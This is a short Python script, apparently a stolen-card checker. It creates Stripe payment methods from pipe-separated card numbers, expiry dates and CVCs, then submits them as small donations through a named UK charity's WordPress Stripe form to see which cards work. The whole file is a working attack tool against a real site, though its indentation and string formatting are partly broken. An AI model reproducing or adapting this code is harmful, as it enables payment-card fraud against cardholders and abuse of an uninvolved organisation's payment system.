import requests,re
import random
def Tele(ccx):
 ccx=ccx.strip()
 n = ccx.split("|")[0]
 mm = ccx.split("|")[1]
 yy = ccx.split("|")[2]
 cvc = ccx.split("|")[3]
 if "20" in yy:#Mo3gza
  yy = yy.split("20")[1]
 r = requests.session()
 
 random_amount1 = random.randint(1, 4)
 random_amount2 = random.randint(1, 99)

 headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 14; 2109119BC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
}

data = 'type=card&billing_details[name]=John+Steve&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Fc264a67020%3B+stripe-js-v3%2Fc264a67020%3B+card-element&key=pk_live_51K6NoPGdie3QtZtYTPVL04kG3KaCqziqWzmChR5GrvLldqfHJQwhadsifZwlw7eEVSOjzqYhHs0WAKBXiK5QMAM300alarMxbt'

response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

pm = response.json()['id']


headers = {
    'authority': 'www.monarchcareuk.com',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://www.monarchcareuk.com',
    'referer': 'https://www.monarchcareuk.com/payments/',
    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 14; 2109119BC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

data = {
    'action': 'wp_full_stripe_inline_donation_charge',
    'wpfs-form-name': 'MonarchCarePayment',
    'wpfs-form-get-parameters': '%7B%7D',
    'wpfs-custom-amount': 'other',
    'wpfs-custom-amount-unique': '1',
    'wpfs-donation-frequency': 'one-time',
    'wpfs-custom-input[]': 'Heyoz',
    'wpfs-card-holder-email': 'jhsha510@gmail.com',
    'wpfs-card-holder-name': 'John Steve',
    'wpfs-terms-of-use-accepted': '1',
    'wpfs-stripe-payment-method-id': f'{pm}',
}

response = requests.post('https://www.monarchcareuk.com/wp-admin/admin-ajax.php', headers=headers, data=data)

result = response.json()['message']
 
 return result
